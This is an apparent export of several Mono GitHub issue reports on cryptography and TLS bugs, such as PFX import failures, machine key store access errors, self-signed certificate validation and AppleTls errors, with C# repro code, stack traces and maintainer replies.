bFtD993uWR0xgeIwDQYJKwYBBAGCNxECMQAwEwYJKoZIhvcNAQkVMQYEBAEAAAAwXQYJKoZIhvcNAQkUMVAeTgB0AGUALQBiAGYAYQA1ADIANABlAGMALQAwADkAMwA3AC0ANAAwAGIAMgAtAGIAOABmAGQALQA2ADQAYgA1ADIANABlADEANABiADEANTBdBgkrBgEEAYI3EQExUB5OAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBvAGYAdAB3AGEAcgBlACAASwBlAHkAIABTAHQAbwByAGEAZwBlACAAUAByAG8AdgBpAGQAZQByMIIDnQYJKoZIhvcNAQcBoIIDjgSCA4owggOGMIIDggYLKoZIhvcNAQwKAQOgggNaMIIDVgYKKoZIhvcNAQkWAaCCA0YEggNCMIIDPjCCAiagAwIBAgIQGc6g7L9HCLFCM2Gty9/P8DANBgkqhkiG9w0BAQsFADAbMRkwFwYDVQQDDBB3d3cuZmFicmlrYW0uY29tMB4XDTIwMDUxNDA3NTc1NloXDTIxMDUxNDA4MTc1NlowGzEZMBcGA1UEAwwQd3d3LmZhYnJpa2FtLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALP9r/ArVINc3famL6RcZtKSWMrEnGJI4MGoijOnad0PVJQhr4RPkQ8JSz9D9oXYb4AXDJKH+9lX6KfChWLeAPSjMVRDYFJH7CaesXb/vm/CSIwt+3mPH3NxdQrSh0+k6xR0yCwQ7rqldIuQ4J9kyGpibLYp42b8z+UoqtFqIXCm01Wz+QYT/ZbLzcRnrkAPN06L+xN+vpubGBCMNNkMxTc6yD3r7s353JtPt0qAgGpRYQmYefx4yx5K8665wETgPk7Ca5IpyAqFwk/x1f7CegedsO0mmEXN6IP2TJheqkagc+xyjOAvdpKuUJueYp+NuLtvYSQzg36hYWEBuhkTTQUCAwEAAaN+MHwwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAsBgNVHREEJTAjghB3d3cuZmFicmlrYW0uY29tgg93d3cuY29udG9zby5jb20wHQYDVR0OBBYEFJmTPJXuQHEtA0VRSG2V/Cp6nbQ3MA0GCSqGSIb3DQEBCwUAA4IBAQCEyzze42pQtTlyYFXzp5ZhnpW18OIYDBS6CukYMc0ZPCi+Pe6uaUqnqBxaOmz1nSXG7OyTlEPuUUPbLUKz6+0pOFKaviZm1RjglGOymcPdvIsk2oWXmo/eapiXtBaEfAvVj6jJ5pUHvDq37XDEwyilpgeN5Hgatf9vYSpF+3H1sN4PVsewBcO39B+p3hHEhVSXIf2vlmSiDqPWpyGYUdB2ldcnArcZSx3MBO2YyrbgIB7irJlBOTaxZhdWugYGdd24oGa6DbYoukwuLY77e5u6jUUafqesp0Kfyu2lqaMNScNAimZizrTiWkAcEgW9RdLy8Cb3bAosFMkVtqovbEYwMRUwEwYJKoZIhvcNAQkVMQYEBAEAAAAwSzAvMAsGCWCGSAFlAwQCAQQg7UIAfCq8KdyEQzXdmvpGgLMKvDwriPTSY3M8b/76mWAEFFlVqCdW0jYIuNhwCkShImxeA3fjAgIH0A=="";

    static void Main(string[] args)
    {
        try
        {
            new System.Security.Cryptography.X509Certificates.X509Certificate2(Convert.FromBase64String(Pfx), ""qwert"");
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
    }
}
```

<!--
You may drag & drop the attachment (repro code/solution, screenshot, etc.) onto the issue.
-->

### Current Behavior

Exception: System.Security.Cryptography.CryptographicException:

```
System.Security.Cryptography.CryptographicException: Unable to decode certificate. ---> System.Security.Cryptography.CryptographicException: `MonoBtlsPkcs12.Import` failed.
  at Mono.Btls.MonoBtlsObject.CheckError (System.Boolean ok, System.String callerName) [0x00047] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\MonoBtlsObject.cs:99
  at Mono.Btls.MonoBtlsObject.CheckError (System.Int32 ret, System.String callerName) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\MonoBtlsObject.cs:103
  at Mono.Btls.MonoBtlsPkcs12.Import (System.Byte[] buffer, Microsoft.Win32.SafeHandles.SafePasswordHandle password) [0x0002e] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\MonoBtlsPkcs12.cs:117
  at Mono.Btls.X509CertificateImplBtls.ImportPkcs12 (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password) [0x0003e] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\X509CertificateImplBtls.cs:261
  at Mono.Btls.X509CertificateImplBtls..ctor (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00047] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\X509CertificateImplBtls.cs:103
   --- End of inner exception stack trace ---
  at Mono.Btls.X509CertificateImplBtls..ctor (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00070] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\X509CertificateImplBtls.cs:115
  at Mono.Btls.MonoBtlsProvider.GetNativeCertificate (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags flags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\MonoBtlsProvider.cs:121
  at Mono.Btls.X509PalImplBtls.Import (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Btls\X509PalImpl.Btls.cs:65
  at Mono.SystemCertificateProvider.Import (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags, Mono.CertificateImportFlags importFlags) [0x00011] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:140
  at Mono.SystemCertificateProvider.Mono.ISystemCertificateProvider.Import (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags, Mono.CertificateImportFlags importFlags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:128
  at System.Security.Cryptography.X509Certificates.X509Helper.Import (System.Byte[] rawData, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Helper.cs:80
  at System.Security.Cryptography.X509Certificates.X509Certificate..ctor (System.Byte[] rawData, System.String password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00040] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Certificate.cs:118
  at System.Security.Cryptography.X509Certificates.X509Certificate..ctor (System.Byte[] rawData, System.String password) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Certificate.cs:100
  at System.Security.Cryptography.X509Certificates.X509Certificate2..ctor (System.Byte[] rawData, System.String password) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\System.Security.Cryptography.X509Certificates\X509Certificate2.cs:96
  at MonoBtlsIssue.Program.Main (System.String[] args) [0x0000c] in <2390febe2a254d4f97b1579d923e3a69>:0
```

### Expected Behavior

No Exception.

## On which platforms did you notice this

[ ] macOS
[ ] Linux
[X] Windows

**Version Used**: mono-6.8.0.123-gtksharp-2.12.45-win32-0.msi

<!--
You can use `mono --version` or About dialog to obtain this information.
-->

## Stacktrace

In my product get a different exception, but it is ponting to MonoBtlsProvider too.

```
System.TypeLoadException: Type Mono.Btls.MonoBtlsProvider has invalid vtable method slot 5 with method none
  at Mono.Net.Security.MonoTlsProviderFactory.InitializeProviderRegistration () [0x0002d] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Net.Security\MonoTlsProviderFactory.cs:229
  at Mono.Net.Security.MonoTlsProviderFactory.InitializeInternal () [0x0001e] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Net.Security\MonoTlsProviderFactory.cs:89
  at Mono.Net.Security.MonoTlsProviderFactory.GetProviderInternal () [0x00010] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Net.Security\MonoTlsProviderFactory.cs:76
  at Mono.Net.Security.MonoTlsProviderFactory.GetProvider () [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Net.Security\MonoTlsProviderFactory.cs:347
  at Mono.Net.Security.NoReflectionHelper.GetProvider () [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono.Net.Security\NoReflectionHelper.cs:62
  at Mono.Security.Interface.MonoTlsProviderFactory.GetProvider () [0x00000] in <ecd074a13e074732b23b4e3db370079c>:0
  at Mono.SystemCertificateProvider.EnsureInitialized () [0x00020] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:92
  at Mono.SystemCertificateProvider.get_X509Pal () [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:100
  at Mono.SystemCertificateProvider.Import (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags, Mono.CertificateImportFlags importFlags) [0x00011] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:140
  at Mono.SystemCertificateProvider.Mono.ISystemCertificateProvider.Import (System.Byte[] data, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags, Mono.CertificateImportFlags importFlags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\Mono\SystemCertificateProvider.cs:128
  at System.Security.Cryptography.X509Certificates.X509Helper.Import (System.Byte[] rawData, Microsoft.Win32.SafeHandles.SafePasswordHandle password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Helper.cs:80
  at System.Security.Cryptography.X509Certificates.X509Certificate..ctor (System.Byte[] rawData, System.String password, System.Security.Cryptography.X509Certificates.X509KeyStorageFlags keyStorageFlags) [0x00040] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Certificate.cs:118
  at System.Security.Cryptography.X509Certificates.X509Certificate..ctor (System.Byte[] rawData, System.String password) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\corlib\System.Security.Cryptography.X509Certificates\X509Certificate.cs:100
  at System.Security.Cryptography.X509Certificates.X509Certificate2..ctor (System.Byte[] rawData, System.String password) [0x00000] in D:\j\workspace\build-package-win-mono\2019-10\mcs\class\System\System.Security.Cryptography.X509Certificates\X509Certificate2.cs:96
```

<!--
You can join us at https://gitter.im/mono/mono to discuss your reported issue
-->
","/cc @baulig ",no,"area-BCL: System.Security,"
mono/mono,407266855,"`CspProviderFlags.UseMachineKeyStore` should throw `PlatformNotSupportedException`","Developer Community issue: https://developercommunity.visualstudio.com/content/problem/414091/systemunauthorizedaccessexception-access-to-the-pa.html

Original post:

```
I am getting the UnathorizedAccessException while using Cryptographic provider with 2048 Key size.

below line procudes the exception in Xamarin Android.
using (RSACryptoServiceProvider rsa2048 = new RSACryptoServiceProvider(2048, m_Csp2048))


Error Message : System.Security.Cryptography.CryptographicException: Could not create machine key store '/usr/share/.mono/keypairs'. ---> System.UnauthorizedAccessException: Access to the path ""/usr"" is denied.
```
","@baulig this looks like we hit machine config even on mobile profileI ran into the same issue. Here is the code that reproduces this and the stack trace I could get.

```
CspParameters cspParams = new CspParameters();
cspParams.Flags = CspProviderFlags.UseMachineKeyStore;
var rsa = new RSACryptoServiceProvider(1024, cspParams);
```

Stack trace:

> at Mono.Security.Cryptography.KeyPairPersistence.get_MachinePath () [0x00086] in <d4a23bbd2f544c30a48c44dd622ce09f>:0 
  at Mono.Security.Cryptography.KeyPairPersistence.get_Filename () [0x0004b] in <d4a23bbd2f544c30a48c44dd622ce09f>:0 
  at Mono.Security.Cryptography.KeyPairPersistence.Load () [0x00000] in <d4a23bbd2f544c30a48c44dd622ce09f>:0 
  at System.Security.Cryptography.RSACryptoServiceProvider.Common (System.Security.Cryptography.CspParameters p) [0x0000c] in <d4a23bbd2f544c30a48c44dd622ce09f>:0 
  at System.Security.Cryptography.RSACryptoServiceProvider..ctor (System.Int32 dwKeySize, System.Security.Cryptography.CspParameters parameters) [0x0001d] in <d4a23bbd2f544c30a48c44dd622ce09f>:0@baulig please look into this issueWell, it is debatable what we should do here - there are three options:

1.  Make it throw `PlatformNotSupportedException` on all platforms (my recommended choice).
2.  Make it throw `PlatformNotSupportedException` on all non-Linux platforms.
3.  Silently ignore `CspProviderFlags.UseMachineKeyStore`; I strongly dislike this.

IMHO the choice is only whether or not this should throw `PlatformNotSupportedException` on Linux (and I think it should considering that it's only experimental even on Linux).

Resetting milestone as this is mostly cosmetic.To give some more background on this:

On all mobile profiles, there is no machine key store (as we do not hook up with the device's certificate / key APIs).

On the Mac, there was a discussion a while ago about what the ""machine config"" path should be (as returned by for instance `Environment.SpecialFolder.CommonApplicationData`).  Since on OS X the '/usr' directory is unwritable (including the `root` user), we can't use this.  I remember people having some debate over whether to use something like `/usr/local` or something in `/Library/Frameworks/Mono.framework` and believe the corefx folks also had their ideas about this.  But AFAIK there hasn't been any conclusion or decision on this topic.

On Linux, using `Environment.SpecialFolder.CommonApplicationData` should work but may require `root` access.Now, after those technical details, to solve the problem for you - what are you trying to accomplish by using `CspProviderFlags.UseMachineKeyStore`?  You can just remove that and it should work fine.",no,"area-BCL: System.Security,target-xamarin-android,"
mono/mono,578314103,"TLS Support not available exception in mono 6.8.0 ","Hi,

I downloaded mono source version 6.8.0 and compiled msvc/mono.sln using VS2019 (vc142, windows10). But when I run the following code ...

```
HttpClient client = new HttpClient();
var result = client.SendAsync(""https:\\someurl.com"").Result;
```

... this exception gets thrown.

`System.Net.WebException: Error: ConnectFailure (TLS Support not available.) ---> System.NotSupported…`

Any idea what happens here ?

Thanks!",,no,"area-BCL: Mono.Security,"
mono/mono,369769315,"[bcl] Failure of certificate verification with self-signed certificate ","<!--
If you are new to the project get yourself familiar with https://www.mono-project.com/community/bugs/make-a-good-bug-report/ before filling the issue
-->

## Steps to Reproduce

Use this RemoteCertificateValidationCallback where `_caCert` is a personal root certificate and certificate is signed by `_caCert`.

```c#
private bool RemoteCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
{
    X509Certificate2 serverCert = (X509Certificate2) certificate;

    if (sslPolicyErrors != (/*SslPolicyErrors.RemoteCertificateNameMismatch |*/ SslPolicyErrors.RemoteCertificateChainErrors))
        return false;
    if (serverCert.Issuer != ""CN=Kryten, O=Internet Widgits Pty Ltd, L=Austin, S=Texas, C=US"")
        return false;

    X509Chain chain0 = new X509Chain();
    chain0.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
    chain0.ChainPolicy.RevocationFlag = X509RevocationFlag.ExcludeRoot;
    chain0.ChainPolicy.ExtraStore.Add(_caCert);
    chain0.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
    if (!chain0.Build(serverCert))
        return false;

    return chain0.ChainElements
        .Cast<X509ChainElement>()
        .Any(x => x.Certificate.Thumbprint == _krytenCert.Thumbprint);
}
```

<!--
You may drag & drop the attachment (repro code/solution, screenshot, etc.) onto the issue.
-->

### Current Behavior

An exception is thrown by `chain0.Build(serverCert)`. This is not the behavior on .NET Core.
<!--
What is the current behavior?
-->

### Expected Behavior

The RemoteCertificateValidationCallback passes, like on .NET Core.
<!--
Please describe the behavior you are expecting
-->

## On which platforms did you notice this

[ ] macOS
[x] Linux
[ ] Windows

**Version Used**: 

```
Mono JIT compiler version 5.16.0.179 (tarball Thu Oct  4 12:22:11 UTC 2018)
Copyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com
        TLS:           __thread
        SIGSEGV:       normal
        Notifications: epoll
        Architecture:  armel,vfp+hard
        Disabled:      none
        Misc:          softdebug
        Interpreter:   yes
        LLVM:          yes(3.6.0svn-mono-/)
        GC:            sgen (concurrent by default)
```


## Stacktrace

```
Unhandled Exception:
System.Security.Authentication.AuthenticationException: A call to SSPI failed, see inner exception. ---> Mono.Btls.MonoBtlsException: Ssl error:1000007d:SSL routines:OPENSSL_internal:CERTIFICATE_VERIFY_FAILED
  at /build/mono-5.16.0.179/external/boringssl/ssl/handshake_client.c:1132
  at Mono.Btls.MonoBtlsContext.ProcessHandshake () [0x00038] in <9b672a45b19f4d52b5f28f32c0c91d97>:0
  at Mono.Net.Security.MobileAuthenticatedStream.ProcessHandshake (Mono.Net.Security.AsyncOperationStatus status, System.Boolean renegotiate) [0x000a1] in <9b672a45b19f4d52b5f28f32c0c91d97>:0
  at (wrapper remoting-invoke-with-check) Mono.Net.Security.MobileAuthenticatedStream.ProcessHandshake(Mono.Net.Security.AsyncOperationStatus,bool)
  at Mono.Net.Security.AsyncHandshakeRequest.Run (Mono.Net.Security.AsyncOperationStatus status) [0x00006] in <9b672a45b19f4d52b5f28f32c0c91d97>:0
  at Mono.Net.Security.AsyncProtocolRequest.ProcessOperation (System.Threading.CancellationToken cancellationToken) [0x000ff] in <9b672a45b19f4d52b5f28f32c0c91d97>:0
  at Mono.Net.Security.AsyncProtocolRequest.StartOperation (System.Threading.CancellationToken cancellationToken) [0x0008b] in <9b672a45b19f4d52b5f28f32c0c91d97>:0
   --- End of inner exception stack trace ---
```

<!--
You can join us at https://gitter.im/mono/mono to discuss your reported issue
-->
","Possibly related to https://github.com/mono/mono/issues/8307, https://github.com/mono/mono/issues/8660, and https://github.com/xamarin/xamarin-android/issues/2176.Output of `mono --version`:

```
Mono JIT compiler version 5.16.0.179 (tarball Thu Oct  4 12:22:11 UTC 2018)
Copyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com
        TLS:           __thread
        SIGSEGV:       normal
        Notifications: epoll
        Architecture:  armel,vfp+hard
        Disabled:      none
        Misc:          softdebug
        Interpreter:   yes
        LLVM:          yes(3.6.0svn-mono-/)
        GC:            sgen (concurrent by default)
```CA and server certificates:

[certs.zip](https://github.com/mono/mono/files/2493993/certs.zip)
",no,"area-BCL: System.Security,"
mono/mono,300602790,"Make Mono.Security for netstandard 2.0","It should probably be done in same way as we did with Mono.Posix.NETStandard.

This is to support scenarios like #7116","/cc @ststeiger",no,"good first issue,proposal,area-BCL: Mono.Security,"
mono/mono,337563615,"ManagedProtection: System.UnauthorizedAccessException on MacOS","CoreFX [ProtectedData xunit tests](https://github.com/mono/corefx/blob/master/src/System.Security.Cryptography.ProtectedData/tests/ProtectedDataTests.cs) (that are aimed only Windows-platform) being run on MacOS leads to failures.
As an example `System.Security.Cryptography.ProtectedDataTests.ProtectedDataTests.WrongEntropy` fails with the following error:
```
      System.Security.Cryptography.CryptographicException : Data protection failed.
      ---- System.Security.Cryptography.CryptographicException : Could not create machine key store '/usr/share/.mono/keypairs'.
      -------- System.UnauthorizedAccessException : Access to the path ""/usr/share/.mono"" is denied.
```

      Stack Trace:
          at System.Security.Cryptography.ProtectedData.Protect (System.Byte[] userData, System.Byte[] optionalEntropy, System.Security.Cryptography.DataProtectionScope scope) [0x00035] in /Users/admin/dev/mono/mcs/class/System.Security/System.Security.Cryptography/ProtectedData.cs:65 
          at System.Security.Cryptography.ProtectedDataTests.ProtectedDataTests.WrongEntropy (System.Byte[] entropy1, System.Byte[] entropy2) [0x00054] in /Users/admin/dev/mono/external/corefx/src/System.Security.Cryptography.ProtectedData/tests/ProtectedDataTests.cs:92 
          at System.Security.Cryptography.ProtectedDataTests.ProtectedDataTests.WrongEntropy () [0x00024] in /Users/admin/dev/mono/external/corefx/src/System.Security.Cryptography.ProtectedData/tests/ProtectedDataTests.cs:82 
          at (wrapper managed-to-native) System.Reflection.MonoMethod.InternalInvoke(System.Reflection.MonoMethod,object,object[],System.Exception&)
          at System.Reflection.MonoMethod.Invoke (System.Object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, System.Object[] parameters, System.Globalization.CultureInfo culture) [0x0003b] in /Users/admin/dev/mono/mcs/class/corlib/System.Reflection/MonoMethod.cs:305 
        ----- Inner Stack Trace -----
          at Mono.Security.Cryptography.KeyPairPersistence.get_MachinePath () [0x00076] in /Users/admin/dev/mono/mcs/class/Mono.Security/Mono.Security.Cryptography/KeyPairPersistence.cs:257 
          at Mono.Security.Cryptography.KeyPairPersistence.get_Filename () [0x0004b] in /Users/admin/dev/mono/mcs/class/Mono.Security/Mono.Security.Cryptography/KeyPairPersistence.cs:139 
          at Mono.Security.Cryptography.KeyPairPersistence.Load () [0x00000] in /Users/admin/dev/mono/mcs/class/Mono.Security/Mono.Security.Cryptography/KeyPairPersistence.cs:167 
          at System.Security.Cryptography.RSACryptoServiceProvider.Common (System.Security.Cryptography.CspParameters p) [0x0000c] in /Users/admin/dev/mono/mcs/class/corlib/System.Security.Cryptography/RSACryptoServiceProvider.cs:112 
          at System.Security.Cryptography.RSACryptoServiceProvider..ctor (System.Int32 dwKeySize, System.Security.Cryptography.CspParameters parameters) [0x0001d] in /Users/admin/dev/mono/mcs/class/corlib/System.Security.Cryptography/RSACryptoServiceProvider.cs:84 
          at Mono.Security.Cryptography.ManagedProtection.GetKey (System.Security.Cryptography.DataProtectionScope scope) [0x00085] in /Users/admin/dev/mono/mcs/class/System.Security/Mono.Security.Cryptography/ManagedProtection.cs:261 
          at Mono.Security.Cryptography.ManagedProtection.Protect (System.Byte[] userData, System.Byte[] optionalEntropy, System.Security.Cryptography.DataProtectionScope scope) [0x00133] in /Users/admin/dev/mono/mcs/class/System.Security/Mono.Security.Cryptography/ManagedProtection.cs:100 
          at System.Security.Cryptography.ProtectedData.Protect (System.Byte[] userData, System.Byte[] optionalEntropy, System.Security.Cryptography.DataProtectionScope scope) [0x0001f] in /Users/admin/dev/mono/mcs/class/System.Security/System.Security.Cryptography/ProtectedData.cs:61 
        ----- Inner Stack Trace -----
          at System.IO.Directory.CreateDirectoriesInternal (System.String path) [0x0005f] in /Users/admin/dev/mono/mcs/class/corlib/System.IO/Directory.cs:121 
          at System.IO.Directory.CreateDirectory (System.String path) [0x0008f] in /Users/admin/dev/mono/mcs/class/corlib/System.IO/Directory.cs:85 
          at System.IO.DirectoryInfo.Create () [0x00000] in /Users/admin/dev/mono/mcs/class/corlib/System.IO/DirectoryInfo.cs:146 
          at (wrapper remoting-invoke-with-check) System.IO.DirectoryInfo.Create()
          at System.IO.Directory.CreateDirectoriesInternal (System.String path) [0x00030] in /Users/admin/dev/mono/mcs/class/corlib/System.IO/Directory.cs:103 
          at System.IO.Directory.CreateDirectory (System.String path) [0x0008f] in /Users/admin/dev/mono/mcs/class/corlib/System.IO/Directory.cs:85 
          at Mono.Security.Cryptography.KeyPairPersistence.get_MachinePath () [0x0005e] in /Users/admin/dev/mono/mcs/class/Mono.Security/Mono.Security.Cryptography/KeyPairPersistence.cs:253 

",,no,"area-BCL: System.Security,"
mono/mono,322022304,"[WebSockets]: Check `ServicePointManager.ServerCertificateValidationCallback`.","## Steps to Reproduce

1. Make a websocket server with a self signed certificate 
2. Try connecting using a ClientWebSocket
3. 


### Current Behavior

The client websocket fails to connect due to the cert not being trusted. Setting `System.Net.ServicePointManager.ServerCertificateValidationCallback` to accept all doesn't seem to affect this.


### Expected Behavior

Allowing `System.Net.ServicePointManager.ServerCertificateValidationCallback` to possibly allow for trust.

## On which platforms did you notice this

[x] macOS
[ ] Linux
[ ] Windows

**Version Used**:

```
mono -V
Mono JIT compiler version 5.8.0.108 (2017-10/9aa78573ee2 Wed Jan 10 04:30:03 EST 2018)
Copyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com
	TLS:           normal
	SIGSEGV:       altstack
	Notification:  kqueue
	Architecture:  amd64
	Disabled:      none
	Misc:          softdebug
	LLVM:          yes(3.6.0svn-mono-master/8b1520c8aae)
	GC:            sgen (concurrent by default)
```

## Stacktrace

```
Unexpected error: System.AggregateException: One or more errors occurred. ---> System.Net.WebSockets.WebSocketException: Unable to connect to the remote server ---> System.Security.Authentication.AuthenticationException: A call to SSPI failed, see inner exception. ---> Mono.Security.Interface.TlsException: CertificateUnknown
  at Mono.AppleTls.AppleTlsContext.EvaluateTrust () [0x000d1] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
  at Mono.AppleTls.AppleTlsContext.RequirePeerTrust () [0x00008] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
  at Mono.AppleTls.AppleTlsContext.ProcessHandshake () [0x00046] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
  at Mono.Net.Security.MobileAuthenticatedStream.ProcessHandshake (Mono.Net.Security.AsyncOperationStatus status) [0x0003e] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
  at (wrapper remoting-invoke-with-check) Mono.Net.Security.MobileAuthenticatedStream.ProcessHandshake(Mono.Net.Security.AsyncOperationStatus)
  at Mono.Net.Security.AsyncHandshakeRequest.Run (Mono.Net.Security.AsyncOperationStatus status) [0x00006] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
  at Mono.Net.Security.AsyncProtocolRequest+<ProcessOperation>d__24.MoveNext () [0x000ff] in <04fdc8acaa5e466bb267a3960bdb1f37>:0
```

<!--

You can join us at https://gitter.im/mono/mono to discuss your reported issue

-->
","It is certainly possible that we did not hook up the callback.  I have some other stuff in that area on my short-term TODO list, so I'll have a look at it.Any progress on this issue? We can reproduce if you need additional information. I have been looking at this and have come up with a solution that works for my test case but I am not sure if it is robust enough to be a general solution. I have implemented the ChainStatus property for Btls. When we execute the certificate verification callback we just don't test for success and set status11. Now we get the error (if any) and map the error code to those defined by ChainStatusFlags and add it to a list of X509ChainStatus objects for that chain. Now when get_ChainStatus is called we convert that list to an array of X509ChainStatus and return it. 

I will generate a PR so that those better familiar with the architecture can critique. Hopefully we can come up with something acceptable.PR #10134 raisedFYI: This seems to be a general issue for all ""modern style"" TLS provider that implement `MonoTlsProvider`. [unity mono fork](https://github.com/Unity-Technologies/mono/) uses a custom TLS provider which runs into the same issue.I can see this still reproing and it completely breaks usage of mono for me. I am using Docker and `mono:6.6` and `mono:6.8` are ignoring the validation callback and just failing to verify the certificates. `mono:5` does not ignore the callback, however it is returning incorrect values when compared with `.netfx`, thus making the application code unportable. The same application code works flawlessly on `.netfx`.I have just attached some code to a to Xamarin.Mac project and i am hitting this error using ClientWebSocket. Works fine on windows platforms - can confirm ServicePointManager.ServerCertificateValidationCallback isnt ever interrogated in the connection attempt which will be the reason for the failure.

@baulig[This Stack Overflow answer](https://stackoverflow.com/a/3752689/2453778) based on the older `ServicePointManager.CertificatePolicy` works on Mono.",no,"os-macOS,area-BCL: Mono.Security,"
mono/mono,524923054,"SSLAuthentication error when using TcpClient with TLS1.2 -> Mono.Security.Interface.TlsException","<!-- Bug report best practices: https://github.com/xamarin/Xamarin.Forms/wiki/Submitting-Issues -->

### Description
I am using TcpClient with TLS1.2  using NSUrlSession (iOS7+) for 'HttpClient Implementation' and occasionally when trying to write or authenticate the stream I get the following SSLAuthentication error:

_Mono.Security.Interface.TlsException: Unknown Secure Transport error `ClosedGraceful'. at Mono.AppleTls.AppleTlsContext.CheckStatusAndThrow (Mono.AppleTls.SslStatus status, Mono.AppleTls.SslStatus[] acceptable) [0x000c1] in /Users/builder/jenkins/workspace/xamarin-macios/xamarin-macios/external/mono/mcs/class/System/Mono.AppleTls/AppleTlsContext.cs:123_

I don't get the exception every time, it seems to happen randomly, especially on iOS 13 and I can get it when trying to:
1) authenticate the client
2) write to an already authenticated stream, (where IsAuthenticated returned true earlier!)

It says on Stackoverflow the issue can be resolved by switching from Apple to Mono TLS implementation but I can't as Mono seems to use an older version of TLS that is not PCI compliant as suggested here https://stackoverflow.com/questions/38528616/tls-exception-unknown-secure-transport-error-closed-graceful

Any help would be appreciated. 

### Steps to Reproduce

1. Open TcpClient SSL stream, 
```
TcpClient tcpClient = new TcpClient(); 
tcpClient.ConnectAsync(host, port);
SslStream sslStream = new SslStream(tcpClient.GetStream());
```

2. Authenticate using TLS1.2 (for PCI compliance)
```
SslProtocols sslProtocols = (SslProtocols)Enum.Parse(typeof(SslProtocols), ""Tls12"");
sslStream.AuthenticateAsClient(this.Host, null, sslProtocols, true);
```

2. AsyncWrite something to stream. (Optionally) create loop to AsynRead from stream on a new 'read' thread

3.  Close TcpClient connections and reopen

4. Repeat 1-3 multiple times till you get error - possibly need to perform 1-3 on several threads running in parallel as our app needs to maintain 4 TcpClient connection at the same time. 

Could this be a threading issue? I am using Async methods wherever possible.

### Expected Behavior
I get no SSL Authentication errors or if I do that I get them every time.
### Actual Behavior
When Authenticating and writing to SSL stream I intermittently get SSL Authentication errors.

### Basic Information

- Version with issue: Xamarin.Forms v4.2.0.709249
- Last known good version: unknown
- IDE: Visual Studio 2017 Windows & Mac
  - iOS:  All - iOS 10>
